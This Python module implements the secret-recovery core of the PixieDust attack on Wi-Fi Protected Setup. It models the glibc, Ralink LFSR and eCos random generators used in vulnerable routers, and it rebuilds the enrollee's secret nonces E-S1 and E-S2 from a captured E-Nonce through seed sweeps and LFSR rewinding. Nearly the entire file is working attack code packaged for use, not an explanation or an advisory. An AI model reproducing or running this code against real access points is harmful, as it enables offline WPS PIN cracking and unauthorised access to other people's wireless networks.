"""Weak-PRNG recovery for the PixieDust WPS attack described by Dominique Bongard (Hack.lu 2014).

Independent implementations derived from the published algorithms -- glibc's TYPE_3 additive
generator, the Ralink/MediaTek Galois LFSR and the eCos LCG -- and not a port of any tool.
Pure functions over ints and bytes, stdlib only, safe to call from a worker process.
"""

from __future__ import annotations

import struct
from typing import List, Optional, Tuple

_U32 = 0xFFFFFFFF
_NONCE_LEN = 16

# --- glibc random(): the TYPE_3 additive generator over the trinomial x^31 + x^3 + 1 ---------

_GLIBC_MODULUS = 0x7FFFFFFF  # 2**31 - 1
_GLIBC_MULTIPLIER = 16807
_GLIBC_SEEDED_WORDS = 31
_GLIBC_FIRST_OUTPUT = 344  # the 34-word fill plus 31*10 warm-up discards
_GLIBC_NONCE_WORDS = 4


def _derive_output_coefficients(count: int) -> Tuple[Tuple[int, ...], ...]:
    """Propagate the additive recurrence symbolically, so each output word is a fixed linear
    combination of the 31 seeded words; derived from the recurrence, not a copied table."""
    vectors: List[List[int]] = [
        [1 if column == row else 0 for column in range(_GLIBC_SEEDED_WORDS)]
        for row in range(_GLIBC_SEEDED_WORDS)
    ]
    for index in range(_GLIBC_SEEDED_WORDS, _GLIBC_FIRST_OUTPUT + count):
        if index < _GLIBC_SEEDED_WORDS + 3:
            vectors.append(list(vectors[index - _GLIBC_SEEDED_WORDS]))
        else:
            earlier, recent = vectors[index - _GLIBC_SEEDED_WORDS], vectors[index - 3]
            vectors.append([a + b for a, b in zip(earlier, recent)])
    return tuple(tuple(vector) for vector in vectors[_GLIBC_FIRST_OUTPUT:])


_GLIBC_COEFFICIENTS = _derive_output_coefficients(_GLIBC_NONCE_WORDS)


def _glibc_seeded_words(seed: int) -> List[int]:
    # srandom() takes an unsigned int (1 for 0), then holds it in an int32_t state word, so a seed
    # >= 2^31 (Unix time past Jan 2038) is sign-extended to negative before the recurrence runs.
    value = seed & _U32 or 1
    if value >= 0x80000000:
        value -= 0x100000000
    words = [value]
    for _ in range(_GLIBC_SEEDED_WORDS - 1):
        value = (_GLIBC_MULTIPLIER * value) % _GLIBC_MODULUS
        words.append(value)
    return words


def _glibc_output_word(seeded_words: List[int], position: int) -> int:
    total = 0
    for coefficient, word in zip(_GLIBC_COEFFICIENTS[position], seeded_words):
        total += coefficient * word
    return (total & _U32) >> 1


def glibc_nonce(seed: int) -> bytes:
    """The 16-byte nonce a glibc-seeded enrollee emits: four random() words, each big-endian."""
    seeded_words = _glibc_seeded_words(seed)
    return struct.pack(
        ">4I", *(_glibc_output_word(seeded_words, k) for k in range(_GLIBC_NONCE_WORDS))
    )


def glibc_first_word(seed: int) -> int:
    """Output word 0 on its own, as a cheap pre-filter for a seed sweep."""
    return _glibc_output_word(_glibc_seeded_words(seed), 0)


def find_glibc_nonce_seed(e_nonce: bytes, start: int, end: int) -> Optional[int]:
    """Scan the inclusive seed range downwards for the seed whose nonce is ``e_nonce``."""
    if len(e_nonce) != _NONCE_LEN:
        return None
    first_word = struct.unpack(">I", e_nonce[:4])[0]
    for seed in range(max(start, end), min(start, end) - 1, -1):
        if glibc_first_word(seed) == first_word and glibc_nonce(seed) == e_nonce:
            return seed
    return None


# --- Ralink / MediaTek: a 32-bit Galois LFSR, run forwards to generate and backwards to recover

# Feedback mask, not a polynomial: the step force-sets bit 31, so this is not a maximal-length
# LFSR. Published as LFSR_MASK in Ralink's own GPLv2 driver (Linux v2.6.29,
# drivers/staging/rt2860/mlme.h:49, used by RandomByte() in common/mlme.c) and named in Bongard,
# "Offline bruteforce attack on WiFi Protected Setup", Hack.lu 2014, slide 60.
_RALINK_TAP = 0x80000057
_RALINK_TOP_BIT = 0x80000000


def _ralink_shift_in_bit(sreg: int, bit: int) -> int:
    """The inverse of one forward step, forcing ``bit`` as the bit that step had emitted."""
    if bit:
        return (((sreg << 1) ^ _RALINK_TAP) | 1) & _U32
    return (sreg << 1) & _U32


def _ralink_step_forward(sreg: int) -> Tuple[int, int]:
    if sreg & 1:
        return 1, ((sreg ^ _RALINK_TAP) >> 1) | _RALINK_TOP_BIT
    return 0, sreg >> 1


def _ralink_step_backward(sreg: int) -> Tuple[int, int]:
    bit = (sreg >> 31) & 1
    return bit, _ralink_shift_in_bit(sreg, bit)


def _ralink_read_byte_forward(sreg: int) -> Tuple[int, int]:
    byte = 0
    for _ in range(8):
        bit, sreg = _ralink_step_forward(sreg)
        byte = (byte << 1) | bit
    return byte, sreg


def _ralink_read_byte_backward(sreg: int) -> Tuple[int, int]:
    byte = 0
    for position in range(8):
        bit, sreg = _ralink_step_backward(sreg)
        byte |= bit << position
    return byte, sreg


def _ralink_restore_byte(sreg: int, byte: int) -> int:
    """Rewind the state across the eight steps that emitted ``byte``."""
    for position in range(8):
        sreg = _ralink_shift_in_bit(sreg, (byte >> position) & 1)
    return sreg


def ralink_forward_stream(sreg: int, nbytes: int) -> bytes:
    """``nbytes`` of LFSR output taken forwards from state ``sreg``."""
    out = bytearray()
    for _ in range(nbytes):
        byte, sreg = _ralink_read_byte_forward(sreg & _U32)
        out.append(byte)
    return bytes(out)


def _ralink_read_block_backward(sreg: int) -> Tuple[bytes, int]:
    block = bytearray(_NONCE_LEN)
    for index in range(_NONCE_LEN - 1, -1, -1):
        block[index], sreg = _ralink_read_byte_backward(sreg)
    return bytes(block), sreg


def ralink_recover(e_nonce: bytes) -> Optional[Tuple[bytes, bytes]]:
    """Rebuild (E-S1, E-S2) from the 48-byte LFSR run whose last 16 bytes are ``e_nonce``."""
    if len(e_nonce) != _NONCE_LEN:
        return None
    sreg = 0
    for byte in reversed(e_nonce):
        sreg = _ralink_restore_byte(sreg, byte)
    if ralink_forward_stream(sreg, _NONCE_LEN) != e_nonce:
        return None  # the nonce is not a run of this LFSR
    e_s2, sreg = _ralink_read_block_backward(sreg)
    e_s1, _ = _ralink_read_block_backward(sreg)
    return e_s1, e_s2


# --- eCos "simple" rand(): three LCG advances composed from disjoint top-bit slices ----------

_ECOS_MULTIPLIER = 1103515245
_ECOS_INCREMENT = 12345
_ECOS_SEED_HIGH_SHIFT = 25


def _ecos_advance(state: int) -> int:
    return (state * _ECOS_MULTIPLIER + _ECOS_INCREMENT) & _U32


def ecos_rand(seed: int) -> Tuple[int, int]:
    """One eCos draw: returns (value, state after the third LCG advance)."""
    state = _ecos_advance(seed & _U32)
    value = state & 0xFFE00000
    state = _ecos_advance(state)
    value += (state & 0xFFFC0000) >> 11
    state = _ecos_advance(state)
    value += (state & 0xFE000000) >> 25
    return value & _U32, state


def _ecos_low_bytes(state: int, count: int) -> Tuple[bytes, int]:
    out = bytearray()
    for _ in range(count):
        value, state = ecos_rand(state)
        out.append(value & 0xFF)
    return bytes(out), state


def ecos_simple_model(seed: int) -> Tuple[bytes, bytes, bytes]:
    """The (nonce, E-S1, E-S2) a vulnerable eCos enrollee derives from ``seed``."""
    state = seed & _U32
    nonce_head = bytes([(state >> _ECOS_SEED_HIGH_SHIFT) & 0xFF])  # the seed's top 7 bits leak
    nonce_tail, state = _ecos_low_bytes(state, _NONCE_LEN - 1)
    e_s1, state = _ecos_low_bytes(state, _NONCE_LEN)
    e_s2, _ = _ecos_low_bytes(state, _NONCE_LEN)
    return nonce_head + nonce_tail, e_s1, e_s2


def ecos_simple_recover(
    e_nonce: bytes, max_counter: int = 0x02000000
) -> Optional[Tuple[bytes, bytes]]:
    """Sweep the 25 unknown seed bits (the top 7 come from nonce[0]) for (E-S1, E-S2)."""
    if len(e_nonce) != _NONCE_LEN:
        return None
    # nonce[0] carries only the seed's top 7 bits; mask it so a byte >= 0x80 is handled the same
    # way rather than letting the shift silently drop bit 7 (true 8-bit semantics need a device).
    known_high = (e_nonce[0] & 0x7F) << _ECOS_SEED_HIGH_SHIFT
    for counter in range(max_counter):
        state = known_high | counter
        for expected in e_nonce[1:]:
            value, state = ecos_rand(state)
            if value & 0xFF != expected:
                break
        else:
            e_s1, state = _ecos_low_bytes(state, _NONCE_LEN)
            e_s2, _ = _ecos_low_bytes(state, _NONCE_LEN)
            return e_s1, e_s2
    return None
